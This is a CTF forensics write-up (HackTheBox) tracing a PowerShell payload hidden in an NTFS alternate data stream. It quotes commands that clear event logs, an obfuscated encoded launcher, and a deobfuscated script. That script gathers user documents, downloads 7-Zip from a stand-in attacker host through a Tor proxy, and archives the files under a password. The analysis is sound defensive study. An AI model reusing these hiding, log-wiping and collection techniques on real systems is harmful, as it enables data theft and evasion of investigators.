---
title: Artifacts of dangerous Sightings writeup
date: 2023-03-23 15:00:00 +0200
categories: [Writeup, HackTheBox]
tags: [forensics, windows, powershell]     # TAG names should always be lowercase
img_path: /assets/img/challenges/artifacts
image: # Thumbnail 
  src: a.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Description
Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces ...

## Writeup
We are given a `vhdx` file, which contains a snapshot of the Windows machine belonging to Pandora. Looking through the snapshot, we find a powershell history file, containing the following:
```console
type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
exit
Get-WinEvent
Get-EventLog -List
wevtutil.exe cl "Windows PowerShell" 
wevtutil.exe cl Microsoft-Windows-PowerShell/Operational
Remove-EventLog -LogName "Windows PowerShell"
Remove-EventLog -LogName Microsoft-Windows-PowerShell/Operational
Remove-EventLog 
```

We can tell based on this that a payload is echoed into the file given by the path `C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1`, and then eventlogs are deleted. 

Wait, what? On the system there is no file named `ActiveSyncProvider.dll:hidden.ps1`, nor `hidden.ps1`, so what's going on here? Turns out, on Windows there is a thing called ADS, or Alternative Data Stream. Basically, it can be used to add meta data to files, however in this case it is used to store a (presumably) malicious payload inside the metadata of `ActiveSyncProvider.dll`. If we look at recently modified files on the snapshot this file also shows up as the most recently modified, so this makes sense. 

We can extract the payload by using the powershell command:
```ps
Get-Content .\ActiveSyncProvider.dll -Stream hidden.ps1
```

The contents of the file looks like this:
```ps
powerShell.exe -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc JAB7AFsAfgBAAH0AIAA9ACAAJAAoACkAOw....
```

As we can tell, the payload runs a base64 encoded string as a powershell script. If we decode this string we end up with a payload that looks like this:

```ps
${[~@} = $();
${!!@!!]} = ++${[~@}; 
${[[!} = --${[~@} + ${!!@!!]} + ${!!@!!]}; 
${~~~]} = ${[[!} + ${!!@!!]}; 
${[!![!} = ${[[!} + ${[[!}; 
${(~(!} = ${~~~]} + ${[[!}; ${!~!))} = ${[!![!} + ${[[!}; 
${((!} = ${!!@!!]} + ${[!![!} + ${[[!}; 
${=!!@!!}  = ${~~~]} - ${!!@!!]} + ${!~!))}; 
${!=} =  ${((!} - ${~~~]} + ${!~!))} - ${!!@!!]}; 
${=@!~!} = "".("$(@{})"[14]+"$(@{})"[16]+"$(@{})"[21]+"$(@{})"[27]+"$?"[1]+"$(@{})"[3]); 
${=@!~!} = "$(@{})"[14]+"$?"[3]+"${=@!~!}"[27]; 
${@!=} = "["+"$(@{})"[7]+"$(@{})"[22]+"$(@{})"[20]+"$?"[1]+"]";

"${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ......" |& ${=@!~!}
```

Obviosuly this looks like a super obfuscated and malicious piece of powershell malware. We can deobfuscate it by opening our powershell terminal, defining the same variables that the script itself defines, and then pasting in the string, without piping it into anything to avoid executing it. Obviously, it this was a real piece of malware we would have to be a little more careful, but since we are on a linux machine anyways it probably won't be too bad. We then get a slightly more deobfuscated version:

```ps
[Char]35 + [Char]35 + [Char]35 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]43 + [Char]32 + [Char]32 + ...
```

We can further deobfuscate this quite trivially, by loading this as a string in a python script, replacing all the `[Char]` blocks with empty strings, and then building the deobfuscated powershell script using the provided char codes. The result of this operation can be seen below:
```ps
function makePass
{
    $alph=@();
    65..90|foreach-object{$alph+=[char]$_};
    $num=@();
    48..57|foreach-object{$num+=[char]$_};

    $res = $num + $alph | Sort-Object {Get-Random};
    $res = $res -join '';
    return $res;
}

function makeFileList
{
    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;
    $List = $files -split '\r';
    return $List;
}

function compress($Pass)
{
    $tmp = $env:TEMP;
    $s = 'https://relic-reclamation-anonymous.alien:1337/prog/';
    $link_7zdll = $s + '7z.dll';
    $link_7zexe = $s + '7z.exe';

    $7zdll = '"'+$tmp+'\7z.dll"';
    $7zexe = '"'+$tmp+'\7z.exe"';
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;

    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';

    $argOut = 'Desktop\AllYourRelikResearchHahaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();
    $argPass = '-p' + $Pass;

    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorAction Stop;
}

$Pass = makePass;
$fileList = @(makeFileList);
$fileResult = makeFileListTable $fileList;
compress $Pass;
$TopSecretCodeToDisableScript = "HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}"
```
We then receive our flag and have solved the challenge.
